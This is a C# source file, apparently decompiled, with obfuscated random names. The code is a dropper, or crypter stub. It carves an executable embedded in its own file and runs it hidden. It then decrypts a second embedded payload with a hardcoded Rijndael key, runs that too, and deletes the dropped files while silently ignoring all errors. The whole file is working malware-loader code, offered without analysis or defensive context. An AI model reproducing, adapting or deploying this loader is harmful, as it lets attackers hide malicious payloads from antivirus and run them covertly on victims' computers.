using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace sUYFiV46;

internal class sUYFiV46sUYFiV1037824 : Form
{
	private static string cf = Convert.ToString(Process.GetCurrentProcess().MainModule!.FileName);

	private static string inf = "c:\\Test\\arwibzTQiZYamMdi2009.exe";

	private static string outf = "sUYFiV1037824.exe";

	private static string tmp = "sUYFiV1037824sUYFiV372151.exe";

	private static string p = "L*??F?,%";

	public static void Main()
	{
		sUYFiV372151();
	}

	private static void sUYFiV372151()
	{
		try
		{
			FileStream fileStream = new FileStream(cf, FileMode.Open, FileAccess.Read);
			BinaryReader binaryReader = new BinaryReader(fileStream);
			byte[] array = new byte[fileStream.Length];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = binaryReader.ReadByte();
			}
			binaryReader.Close();
			fileStream.Close();
			FileStream fileStream2 = new FileStream(tmp, FileMode.CreateNew);
			BinaryWriter binaryWriter = new BinaryWriter(fileStream2);
			for (int j = 5632; j < 1037824; j++)
			{
				binaryWriter.BaseStream.WriteByte(array[j]);
			}
			fileStream2.Close();
			binaryWriter.Close();
			File.SetAttributes(tmp, FileAttributes.Hidden);
			try
			{
				Process.Start(tmp).WaitForExit();
				File.Delete(tmp);
			}
			catch
			{
			}
			FileStream fileStream3 = new FileStream(inf, FileMode.CreateNew);
			BinaryWriter binaryWriter2 = new BinaryWriter(fileStream3);
			for (int k = 1037824; k < array.Length; k++)
			{
				binaryWriter2.BaseStream.WriteByte(array[k]);
			}
			fileStream3.Close();
			binaryWriter2.Close();
			File.SetAttributes(inf, FileAttributes.Hidden);
			if (p.Length > 8)
			{
				p = p.Substring(0, 8);
			}
			else if (p.Length < 8)
			{
				int num = 8 - p.Length;
				for (int l = 0; l < num; l++)
				{
					p += l;
				}
			}
			UnicodeEncoding unicodeEncoding = new UnicodeEncoding();
			byte[] bytes = unicodeEncoding.GetBytes(p);
			FileStream fileStream4 = new FileStream(inf, FileMode.Open);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			CryptoStream cryptoStream = new CryptoStream(fileStream4, rijndaelManaged.CreateDecryptor(bytes, bytes), CryptoStreamMode.Read);
			if (File.Exists(outf))
			{
				File.Delete(outf);
			}
			FileStream fileStream5 = new FileStream(outf, FileMode.Create);
			int num2;
			while ((num2 = cryptoStream.ReadByte()) != -1)
			{
				fileStream5.WriteByte((byte)num2);
			}
			fileStream5.Close();
			cryptoStream.Close();
			fileStream4.Close();
			if (File.Exists(inf))
			{
				File.Delete(inf);
			}
			Thread thread = new Thread(sUYFiV372151sUYFiV1037824);
			thread.Start();
		}
		catch (Exception)
		{
		}
	}

	private static void sUYFiV372151sUYFiV1037824()
	{
		try
		{
			Process.Start(outf).WaitForExit();
			File.Delete(outf);
		}
		catch
		{
		}
	}
}
